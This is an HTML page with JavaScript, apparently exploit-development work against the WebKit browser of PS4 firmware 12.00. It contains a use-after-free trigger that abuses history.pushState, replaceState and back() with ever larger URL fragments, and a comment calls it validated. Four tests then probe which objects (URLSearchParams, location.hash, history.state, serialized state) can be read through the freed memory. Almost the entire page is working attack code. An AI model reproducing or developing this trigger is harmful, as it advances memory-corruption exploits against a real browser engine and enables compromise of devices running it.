<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit 12.00 — UAF Target Object Mapping</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { margin:4px; }
pre { white-space: pre-wrap; }
</style>
</head>
<body>

<h2>UAF Target Object Mapping</h2>

<button onclick="testURLSearchParams()">TEST 1 — URLSearchParams</button>
<button onclick="testLocation()">TEST 2 — location.href / hash</button>
<button onclick="testHistoryState()">TEST 3 — history.state</button>
<button onclick="testSerializedState()">TEST 4 — Serialized history.state</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(s){ logEl.textContent += s + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// ============================
// UAF TRIGGER (VALIDADO POR VOCÊ)
// ============================
async function triggerUAF(){
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0)
            setTimeout(()=>history.back(),0);
        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

// ============================
// TEST 1 — URLSearchParams
// ============================
async function testURLSearchParams(){
    logEl.textContent="";
    await triggerUAF();

    let before = document.URL.length;
    let p = new URLSearchParams(location.hash.slice(1));

    log("[URLSP] URL.length = " + before);
    log("[URLSP] size via params.toString().length = " + p.toString().length);
    log("[URLSP] charCodeAt(0) = " + document.URL.charCodeAt(0));
    log("[URLSP] charCodeAt(64) = " + document.URL.charCodeAt(64));
}

// ============================
// TEST 2 — location.href / hash
// ============================
async function testLocation(){
    logEl.textContent="";
    await triggerUAF();

    let before = document.URL.length;
    location.hash = "#B".repeat(32);

    log("[LOC] URL.length before = " + before);
    log("[LOC] URL.length after  = " + document.URL.length);
    log("[LOC] logical change? " + (before !== document.URL.length));
    log("[LOC] charCodeAt(64) = " + document.URL.charCodeAt(64));
}

// ============================
// TEST 3 — history.state object
// ============================
async function testHistoryState(){
    logEl.textContent="";
    await triggerUAF();

    history.replaceState({k:"A".repeat(64)}, "", location.href);

    let st = history.state;
    log("[STATE] typeof state = " + typeof st);
    log("[STATE] key length = " + st.k.length);
    log("[STATE] URL.length = " + document.URL.length);
    log("[STATE] charCodeAt(64) = " + document.URL.charCodeAt(64));
}

// ============================
// TEST 4 — Serialized JSValue
// ============================
async function testSerializedState(){
    logEl.textContent="";
    await triggerUAF();

    history.replaceState({x:"C".repeat(128)}, "", location.href);

    let s = JSON.stringify(history.state);
    log("[SER] serialized length = " + s.length);
    log("[SER] URL.length = " + document.URL.length);
    log("[SER] charCodeAt(64) = " + document.URL.charCodeAt(64));
}
</script>
</body>
</html>
